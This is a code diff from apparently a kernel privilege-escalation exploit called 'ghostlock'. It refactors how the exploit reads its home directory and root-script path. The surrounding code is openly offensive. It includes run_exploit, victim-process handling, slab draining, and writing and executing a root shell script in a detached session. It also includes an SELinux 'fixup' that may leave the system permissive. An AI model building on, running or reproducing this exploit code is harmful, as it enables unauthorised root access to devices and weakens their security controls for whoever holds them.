@@ -22,12 +22,12 @@
 
 #include "target.h"
 
-// TODO(post-S15:SESSION-01): Pass RuntimeConfig via ExploitSession.
-// Input: const session config; output: paths without process-global aliases.
-// Retained because victim/handoff orchestration remains centralized in main;
-// the aliases expose stable c_str() pointers only at syscall/exec boundaries.
-#define g_home_dir (runtime_config_snapshot().home_dir.c_str())
-#define g_root_script_path (runtime_config_snapshot().root_script_path.c_str())
+/* The home dir and root script path are read from the session snapshot at
+ * every syscall/exec boundary. Keeping the reads inline means the call
+ * sites pass stable c_str() pointers exactly where the kernel or exec
+ * needs them and nowhere else, and no process-global path state is
+ * exposed outside the session (CPP12/SESSION-01). */
+
 
 /* Override target.h _OFF macros with the resolved runtime profile. */
 #undef SELINUX_ENFORCING_OFF
@@ -562,7 +562,7 @@ static void apply_iomem_cache(void) {
             target_profile_values(&g_target_profile);
     const char *release = values && values->uname_r ? values->uname_r : "";
 
-    snprintf(path, sizeof(path), "%s/.ghostlock_iomem", g_home_dir);
+    snprintf(path, sizeof(path), "%s/.ghostlock_iomem", (runtime_config_snapshot().home_dir.c_str()));
     FILE *f = fopen(path, "r");
     if (f) {
         /* the first line names the release that wrote the dump */
@@ -716,10 +716,10 @@ static void slab_drain(void) {
 static void write_root_script(void) {
     char script[8192];
     ghostlock::UniqueFd sfd(
-            open(g_root_script_path, O_WRONLY | O_CREAT | O_TRUNC, 0755));
+            open((runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
     if (!sfd.valid()) {
         pr_warning("open root script failed path=%s errno=%d\n",
-                g_root_script_path, errno);
+                (runtime_config_snapshot().root_script_path.c_str()), errno);
         return;
     }
 
@@ -869,7 +869,7 @@ static void write_root_script(void) {
             "else\n"
             "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
             "fi\n",
-            g_home_dir);
+            (runtime_config_snapshot().home_dir.c_str()));
     if (n < 0 || n >= (int) sizeof(script)) {
         pr_warning("root script too long\n");
         return;
@@ -878,8 +878,8 @@ static void write_root_script(void) {
         pr_warning("write root script failed errno=%d\n", errno);
     }
     sfd.reset();
-    chmod(g_root_script_path, 0755);
-    pr_info("root script written path=%s bytes=%d\n", g_root_script_path, n);
+    chmod((runtime_config_snapshot().root_script_path.c_str()), 0755);
+    pr_info("root script written path=%s bytes=%d\n", (runtime_config_snapshot().root_script_path.c_str()), n);
 }
 
 /* Find a task through perf sample records. */
@@ -1067,7 +1067,7 @@ static void child_main(ghostlock::VictimContext *p) {
             p->uid_write.reset();
             park_rooted_child();
         } else if (cmd == 'G' || cmd == 'X') {
-            pr_info("handoff: root script path=%s\n", g_root_script_path);
+            pr_info("handoff: root script path=%s\n", (runtime_config_snapshot().root_script_path.c_str()));
             break;
         }
     }
@@ -1087,7 +1087,7 @@ static void child_main(ghostlock::VictimContext *p) {
      * failed with EFAULT at the kernel boundary even though userspace could
      * print it, so the exec path must travel in process-stable stack storage. */
     char script_path[320];
-    snprintf(script_path, sizeof(script_path), "%s", g_root_script_path);
+    snprintf(script_path, sizeof(script_path), "%s", (runtime_config_snapshot().root_script_path.c_str()));
     pid_t worker = fork();
     if (worker == 0) {
         /* Detach into a brand-new session: the independent root shell owns the
@@ -1714,7 +1714,7 @@ int run_exploit(int argc, char **argv) {
     handoff_policy.enforce_poll_interval_ms =
             execution_settings()->handoff_enforce_poll_interval_ms;
     const ghostlock::HandoffProbeResult handoff =
-            ghostlock::handoff_probe_run(handoff_policy, g_home_dir);
+            ghostlock::handoff_probe_run(handoff_policy, (runtime_config_snapshot().home_dir.c_str()));
     if (handoff.enforce_ok)
         pr_info("enforce=1 (enforcing)\n");
     else if (handoff.ksu_log_loaded)
